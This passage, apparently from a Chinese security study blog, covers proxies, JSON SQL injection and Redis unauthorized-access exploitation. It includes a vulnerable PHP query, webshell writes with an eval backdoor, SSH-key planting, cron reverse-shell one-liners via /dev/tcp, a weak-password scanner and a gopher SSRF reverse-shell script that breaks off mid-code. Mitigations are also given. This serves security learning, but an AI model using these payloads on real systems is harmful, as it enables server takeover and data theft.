<h3 id="三-反向代理"><a href="#三-反向代理" class="headerlink" title="三 反向代理"></a>三 反向代理</h3><p>反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器</p>
<p> <img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402200117241.png"></p>
<h4 id="反向代理的作用："><a href="#反向代理的作用：" class="headerlink" title="反向代理的作用："></a>反向代理的作用：</h4><p>（1）保证内网的安全，阻止web攻击，大型网站，通常将反向代理作为公网访问地址，Web服务器是内网</p>
<p>（2）负载均衡，通过反向代理服务器来优化网站的负载</p>
<h3 id="四-总结"><a href="#四-总结" class="headerlink" title="四 总结"></a>四 总结</h3><p><strong>正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端.</strong></p>
<p><strong>反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端</strong></p>
<h4 id="看图理解一："><a href="#看图理解一：" class="headerlink" title="看图理解一："></a>看图理解一：</h4><p><strong><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1350514-20190313105354768-2077480083.png"></strong></p>
<h4 id="看图理解二："><a href="#看图理解二：" class="headerlink" title="看图理解二："></a>看图理解二：</h4><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1350514-20190313105516378-237949533.png"></p>
<p>正向代理中，proxy和client同属一个LAN，对server透明；<br>反向代理中，proxy和server同属一个LAN，对client透明。<br>实际上proxy在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把后出现的那种代理方式叫成了反向代理</p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>正向代理: 买票的黄牛</p>
<p>反向代理: 租房的代理</p>
<h2 id="13-SQL注入JSON接口与白名单"><a href="#13-SQL注入JSON接口与白名单" class="headerlink" title="13.SQL注入JSON接口与白名单"></a>13.SQL注入JSON接口与白名单</h2><h3 id="一、Json简介"><a href="#一、Json简介" class="headerlink" title="一、Json简介"></a>一、Json简介</h3><p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application&#x2F;json”。</p>
<h4 id="json语法"><a href="#json语法" class="headerlink" title="json语法"></a>json语法</h4><pre class="line-numbers language-none"><code class="language-none">数据在名称&#x2F;值对中
数据由逗号分隔
大括号保存对象
中括号保存数组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="JSON-值"><a href="#JSON-值" class="headerlink" title="JSON 值"></a>JSON 值</h4><p>JSON 值可以是：</p>
<pre class="line-numbers language-none"><code class="language-none">数字（整数或浮点数）  &#123;&quot;age&quot;:30 &#125;
字符串（在双引号中）  &#123;&quot;uname&quot;:&quot;yang&quot;&#125;
逻辑值（true 或 false） &#123;&quot;flag&quot;:true &#125;
数组（在中括号中）&#123;&quot;sites&quot;:[&#123;&quot;name&quot;:&quot;yang&quot;&#125;,&#123;&quot;name&quot;:&quot;ming&quot;&#125;]&#125;
对象（在大括号中）JSON 对象在大括号（&#123;&#125;）中书写：
null    &#123; &quot;runoob&quot;:null &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="Json-demo"><a href="#Json-demo" class="headerlink" title="Json-demo:"></a>Json-demo:</h4><pre class="line-numbers language-none"><code class="language-none">&#123;
  &quot;users&quot;: &#123;
    &quot;user&quot;: [
      &#123;
        &quot;id&quot;: &quot;1&quot;,
        &quot;username&quot;: &quot;admin&quot;,
        &quot;passwd&quot;: &quot;admin888&quot;
      &#125;,
      &#123;
        &quot;id&quot;: &quot;2&quot;,
        &quot;username&quot;: &quot;root&quot;,
        &quot;passwd&quot;: &quot;root123&quot;
      &#125;,
      &#123;
        &quot;id&quot;: &quot;3&quot;,
        &quot;username&quot;: &quot;system&quot;,
        &quot;passwd&quot;: &quot;system456&quot;
      &#125;
    ]
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="二、JSON注入"><a href="#二、JSON注入" class="headerlink" title="二、JSON注入"></a>二、JSON注入</h3><p>和xml注入一样，只是数据表现形式不同而已。</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
  header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);
  if(isset($_POST[&#39;json&#39;]))&#123;
    $json_str&#x3D;$_POST[&#39;json&#39;];
    $json&#x3D;json_decode($json_str);
    if(!$json)&#123;
      die(&#39;JSON文档格式有误，请检查&#39;);
    &#125;
    $username&#x3D;$json-&gt;username;
    &#x2F;&#x2F;$passwd&#x3D;$json-&gt;passwd;
 
    $mysqli&#x3D;new mysqli();
    $mysqli-&gt;connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;);
    if($mysqli-&gt;connect_errno)&#123;
      die(&#39;数据库连接失败：&#39;.$mysqli-&gt;connect_error);
    &#125;
    $mysqli-&gt;select_db(&#39;user&#39;);
    if($mysqli-&gt;errno)&#123;
      dir(&#39;打开数据库失败：&#39;.$mysqli-&gt;error);
    &#125;
    $mysqli-&gt;set_charset(&#39;utf-8&#39;);
    $sql&#x3D;&quot;SELECT username,paawd FROM users WHERE username&#x3D;&#39;&#123;$username&#125;&#39;&quot;;
    $result&#x3D;$mysqli-&gt;query($sql);
    if(!$result)&#123;
      die(&#39;执行SQL语句失败：&#39;.$mysqli-&gt;error);
    &#125;else if($result-&gt;num_rows&#x3D;&#x3D;0)&#123;
      die(&#39;查询结果为空&#39;);
    &#125;else &#123;
      $array1&#x3D;$result-&gt;fetch_all(MYSQLI_ASSOC);
      echo &quot;用户名：&#123;$array1[0][&#39;username&#39;]&#125;,密码：&#123;$array1[0][&#39;paawd&#39;]&#125;&quot;;
    &#125;
    $result-&gt;free();
    $mysqli-&gt;close();
  &#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>和SQL注入一样，插入注入语句。但要注意一点是对影响json语句的要进行转义，如双引号、花括号等。</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402201334771.png"></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402201354160.png"></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402201408252.png"></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402201425887.png"></p>
<h2 id="14-Redis未授权与权限获取"><a href="#14-Redis未授权与权限获取" class="headerlink" title="14.Redis未授权与权限获取"></a>14.Redis未授权与权限获取</h2><h3 id="一-漏洞简介以及危害"><a href="#一-漏洞简介以及危害" class="headerlink" title="一 漏洞简介以及危害"></a>一 漏洞简介以及危害</h3><h4 id="1-什么是redis未授权访问漏洞"><a href="#1-什么是redis未授权访问漏洞" class="headerlink" title="1.什么是redis未授权访问漏洞"></a><strong>1.什么是redis未授权访问漏洞</strong></h4><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis  服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
<p>简单说，漏洞的产生条件有以下两点：</p>
<pre class="line-numbers language-none"><code class="language-none">（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；
（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2.漏洞危害"></a>2.漏洞危害</h4><pre class="line-numbers language-none"><code class="language-none">（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；
（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；
（3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="3-漏洞影响"><a href="#3-漏洞影响" class="headerlink" title="3.漏洞影响"></a>3.漏洞影响</h4><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180828144710796-14972166.png"></p>
<p>根据 ZoomEye 的探测，全球无验证可直接利用Redis 分布情况如下：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1.jpg"></p>
<p>全球无验证可直接利用Redis TOP 10国家与地区：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/2.jpg"></p>
<h3 id="二-漏洞复现"><a href="#二-漏洞复现" class="headerlink" title="二 漏洞复现"></a>二 漏洞复现</h3><p>下载并安装测试用的Redis，本次采用的是Ubuntu镜像：</p>
<pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz

(如果下载不下来的话：http:&#x2F;&#x2F;distfiles.macports.org&#x2F;redis&#x2F;）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829135535684-1291475162.png"></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829135548075-49366262.png"></p>
<pre class="line-numbers language-none"><code class="language-none">解压安装包：tar xzf redis-2.8.17.tar.gz进入redis目录：cd redis-2.8.17安装：make<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829140031532-622380540.png"></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829140211357-1935236264.png"></p>
<pre class="line-numbers language-none"><code class="language-none">make结束后，进入src目录：cd src，
将redis-server和redis-cli拷贝到&#x2F;usr&#x2F;bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829144712793-1804449351.png"></p>
<pre class="line-numbers language-none"><code class="language-none">返回目录redis-2.8.17，将redis.conf拷贝到&#x2F;etc&#x2F;目录下：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829144957783-1493349378.png"></p>
<pre class="line-numbers language-none"><code class="language-none">使用&#x2F;etc&#x2F;目录下的reids.conf文件中的配置启动redis服务：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829150759215-364206028.png"></p>
<p>服务启动成功，我们克隆这台虚拟机</p>
<p>一台作为攻击机，一台作为靶机</p>
<p>攻击机IP：192.168.0.105</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829152953967-1919683076.png"></p>
<p>靶机IP：192.168.0.104</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829153116853-982348081.png"></p>
<pre class="line-numbers language-none"><code class="language-none">启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了。 比如：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829153756135-561199849.png"></p>
<h3 id="未授权访问漏洞测试"><a href="#未授权访问漏洞测试" class="headerlink" title="未授权访问漏洞测试"></a>未授权访问漏洞测试</h3><p>使用redis客户端直接无账号成功登录redis：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829154232290-987852098.png"></p>
<p>从登录的结果可以看出该redis服务对公网开放，且未启用认证。</p>
<h4 id="0x01-利用redis写webshell"><a href="#0x01-利用redis写webshell" class="headerlink" title="0x01 利用redis写webshell"></a>0x01 利用redis写webshell</h4><pre class="line-numbers language-none"><code class="language-none">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证
2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限
（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这里由于本地搭建，我们已经知道目录，我们把shell写入<code>/home/bmjoker/</code>目录下：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829154920415-7768410.png"></p>
<p><strong>注：</strong></p>
<p>第三步写入webshell的时候，可以使用：</p>
<pre class="line-numbers language-none"><code class="language-none">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p>
<p>shell写入完成，我们在靶机上来证明：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829155036709-1324637836.png"></p>
<p>成功写入shell。</p>
<p>当数据库过大时，redis写shell的小技巧：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
set_time_limit(0);
$fp&#x3D;fopen(&#39;bmjoker.php&#39;,&#39;w&#39;);
fwrite($fp,&#39;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#39;);
exit();
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="0x02-利用“公私钥”认证获取root权限"><a href="#0x02-利用“公私钥”认证获取root权限" class="headerlink" title="0x02 利用“公私钥”认证获取root权限"></a>0x02 利用“公私钥”认证获取root权限</h4><p>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。</p>
<p>靶机中开启redis服务：<code>redis-server /etc/redis.conf</code></p>
<p>在靶机中执行 <code>mkdir /root/.ssh</code>  命令，创建ssh公钥存放目录（靶机是作为ssh服务器使用的）</p>
<p>在攻击机中生成ssh公钥和私钥，密码设置为空：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829155921988-1732814764.png"></p>
<p>进入.ssh目录：cd .ssh&#x2F;，将生成的公钥保存到1.txt：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829160548947-2128769871.png"></p>
<p>链接靶机上的redis服务，</p>
<p>将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829161011553-822649757.png"></p>
<p>远程登录靶机的redis服务：redis-cli -h 192.168.0.104 </p>
<p>并使用 CONFIG GET dir 命令得到redis备份的路径：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829161153168-376237139.png"></p>
<p>更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh）：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829162331061-1260329184.png"></p>
<p>设置上传公钥的备份文件名字为authorized_keys：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829161728063-2047960668.png"></p>
<p>检查是否更改成功（查看有没有authorized_keys文件），没有问题就保存然后退出，</p>
<p>至此成功写入ssh公钥到靶机：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829161842166-832702796.png"></p>
<p>在攻击机上使用ssh免密登录靶机：ssh -i id_rsa <a href="mailto:&#x72;&#x6f;&#111;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#48;&#46;&#49;&#x30;&#52;">&#x72;&#x6f;&#111;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#48;&#46;&#49;&#x30;&#52;</a></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829162556455-2061016348.png"></p>
<p>利用私钥成功登录redis服务器！！！</p>
<h4 id="0x03-利用ceontab反弹sehll"><a href="#0x03-利用ceontab反弹sehll" class="headerlink" title="0x03 利用ceontab反弹sehll"></a>0x03 利用ceontab反弹sehll</h4><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p>
<p><strong>端口监听:</strong></p>
<p>在攻击者服务器上监听一个端口（未被占用的任意端口）：</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829163608215-1510741291.png"></p>
<p><strong>攻击详情：</strong></p>
<p>连接redis，写入反弹shell</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 192.168.0.104
set xxx &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.0.104&#x2F;4444 0&gt;&amp;1\n\n&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829163924530-654251233.png"></p>
<pre class="line-numbers language-none"><code class="language-none">config set dir &#x2F;var&#x2F;spool&#x2F;cron
config set dbfilename root
save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829164111606-684044630.png"></p>
<p>过一分钟左右就可以收到shell</p>
<h3 id="Python脚本自动化测试"><a href="#Python脚本自动化测试" class="headerlink" title="Python脚本自动化测试"></a>Python脚本自动化测试</h3><p>可用来测试是否存在未授权或弱口令的情况：</p>
<pre class="line-numbers language-none"><code class="language-none">#! &#x2F;usr&#x2F;bin&#x2F;env python
# _*_  coding:utf-8 _*_
import socket
import sys
PASSWORD_DIC&#x3D;[&#39;redis&#39;,&#39;root&#39;,&#39;oracle&#39;,&#39;password&#39;,&#39;p@aaw0rd&#39;,&#39;abc123!&#39;,&#39;123456&#39;,&#39;admin&#39;]
def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send(&quot;INFO\r\n&quot;)
        result &#x3D; s.recv(1024)
        if &quot;redis_version&quot; in result:
            return u&quot;未授权访问&quot;
        elif &quot;Authentication&quot; in result:
            for pass_ in PASSWORD_DIC:
                s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                s.send(&quot;AUTH %s\r\n&quot; %(pass_))
                result &#x3D; s.recv(1024)
                if &#39;+OK&#39; in result:
                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)
    except Exception, e:
        pass
if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    ip&#x3D;sys.argv[1]
    port&#x3D;sys.argv[2]
    print check(ip,port, timeout&#x3D;10)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1、比较安全的办法是采用绑定IP的方式来进行控制。</p>
<p> 请在redis.conf文件找到如下配置</p>
<pre class="line-numbers language-none"><code class="language-none">If you want you can bind a single interface, if the bind option is not
# specified all the interfaces will listen for incoming connections.
#
# bind 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>把 #bind  127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问，这种情况下，我们在启动redis服务器的时候不能再用:redis-server，改为:redis-server path&#x2F;redis.conf  即在启动的时候指定需要加载的配置文件,其中path&#x2F;是你上面修改的redis配置文件所在目录，这个方法有一点不太好，我难免有多台机器访问一个redis服务。</p>
<p>2、设置密码，以提供远程登陆</p>
<p>打开redis.conf配置文件，找到requirepass，然后修改如下:</p>
<pre class="line-numbers language-none"><code class="language-none">requirepass yourpassword
yourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。
  
命令如下:
redis-cli -h yourIp -p yourPort&#x2F;&#x2F;启动redis客户端，并连接服务器
keys * &#x2F;&#x2F;输出服务器中的所有key
报错如下
(error) ERR operation not permitted
  
这时候你可以用授权命令进行授权，就不报错了
  
命令如下:
auth youpassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Redis配置错误导致的代码漏洞溯源"><a href="#Redis配置错误导致的代码漏洞溯源" class="headerlink" title="Redis配置错误导致的代码漏洞溯源"></a>Redis配置错误导致的代码漏洞溯源</h3><p>在刷墨者学院的题时，发现了这个不错的题，通过这个题了解Redis在低权限下的渗透思路：**<br>**</p>
<p>给出了IP：219.153.49.228  ，同时也给出了俩个端口一个是web也就是http端口 419387，一个是redis数据库端口 48055</p>
<p>尝试用kali链接redis端口：</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 219.153.49.228 -p 48055<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>连接成功，本想用上文的方法，生成ssh密钥把内容写进redis数据库，然后把redis数据库的目录指定到&#x2F;etc&#x2F;.ssh&#x2F;，这样就可以通过ssh直接连接服务器，但是这里权限不够，不能指定到&#x2F;etc&#x2F;.ssh&#x2F;目录。</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20181123172246778-1998041521.png"></p>
<p>由于服务器是ubuntu的，apache容器，尝试指定一下默认的路径&#x2F;var&#x2F;www&#x2F;html&#x2F;来写入shell:</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20181123172729865-2027000407.png"></p>
<p>一波写入shell的操作，然后在web页面尝试访问我们写入shell的joker.php文件：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20181123172912361-631905750.png"></p>
<p>成功写入，尝试用菜刀链接，获取flag:</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20181123173001594-1100631431.png"></p>
<p>出现这样的问题还是权限控制的不足</p>
<p><strong>redis主从复制rce</strong><br>　　Redis是一个使用ANSI  C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
<p>　　在Redis  4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。编写恶意so文件的代码 <a target="_blank" rel="noopener" href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p>
<p>　　在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
<p>网上收集两个比较方便的getshell python脚本</p>
<p>1.<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<p>漏洞利用：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20191009204600409-535665648.png"></p>
<p>2.<a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
<p>漏洞利用：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20191009204627174-873967484.png"></p>
<p>反弹到其他服务器：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20191009204650932-923209536.png"></p>
<p><strong>ssrf，redis与gopher</strong></p>
<p>补充篇只来讨论如果通过ssrf探测到内网某ip开启了6379端口，并存在未授权，如何结合gopher协议来写shell。</p>
<p>　　gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，gopher是Internet上最主要的信息检索工具，gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p>
<p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
<p>gopher协议格式：</p>
<pre class="line-numbers language-none"><code class="language-none">URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流
gopher的默认端口是70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>如果发起post请求，回车换行需要使用%0d%0a，如果存在多个参数，参数之间的&amp;也需要进行URL编码。注意%0d%0a是\r\n的URL编码。</p>
<p>gopher发送请求HTTP GET请求:</p>
<pre class="line-numbers language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;192.168.194.1:6666&#x2F;_abcd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意：abcd是要传递的数据，_会被吃掉不会传递过去</p>
<p>由于gopher协议规则比较复杂，这里借助一个github的工具来生成payload：<a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools">https://github.com/firebroo/sec_tools</a></p>
<p>只需要在redis-over-gopher&#x2F;redis.cmd中写入redis执行的命令，比如下面的命令直接在web目录下写shell</p>
<pre class="line-numbers language-none"><code class="language-none">flushall
config set dir &#x2F;tmp
config set dbfilename shell.php
set &#39;webshell&#39; &#39;&lt;?php phpinfo();?&gt;&#39;
save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>编辑好后运行redis-over-gopher&#x2F;redis-over-gopher.py </p>
<pre class="line-numbers language-none"><code class="language-none">python redis-over-gopher.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>就可以生成支持gopher协议的payload：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102184648153-1395513140.png"></p>
<p>使用curl运行payload</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102184706456-696764708.png"></p>
<p>进入docker容器，发现shell.php已经成功生成</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102184639299-51740366.png"></p>
<p>注：需要将内容再进行一次url编码传到web的参数中才会正常运行</p>
<p>使用ssrf端口探测的时候，不要拘泥于http协议，还可以使用dict协议来进行探测</p>
<p>利用gopher协议反弹shell</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;*gopher协议反弹shell利用脚本*&#x2F;
import urllib
protocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;
ip&#x3D;&quot;192.168.127.140&quot;
port&#x3D;&quot;6379&quot;
reverse_ip&#x3D;&quot;192.168.127.131&quot;
reverse_port&#x3D;&quot;7777&quot;
cron&#x3D;&quot;\n\n\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;%s 0&gt;&amp;1\n\n\n\n&quot;%(reverse_ip,reverse_port)
filename&#x3D;&quot;root&quot;
path&#x3D;&quot;&#x2F;var&#x2F;spool&#x2F;cron&quot;
passwd&#x3D;&quot;&quot;
cmd&#x3D;[&quot;flushall&quot;,
   &quot;set 1 &#123;&#125;&quot;.format(cron.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),
   &quot;config set dir &#123;&#125;&quot;.format(path),
   &quot;config set dbfilename &#123;&#125;&quot;.format(filename),
   &quot;save&quot;
   ]
if passwd:
  cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))
payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;
def redis_format(arr):
  CRLF&#x3D;&quot;\r\n&quot;
  redis_arr &#x3D; arr.split(&quot; &quot;)
  cmd&#x3D;&quot;&quot;
  cmd+&#x3D;&quot;*&quot;+str(len(redis_arr))
  for x in redis_arr:
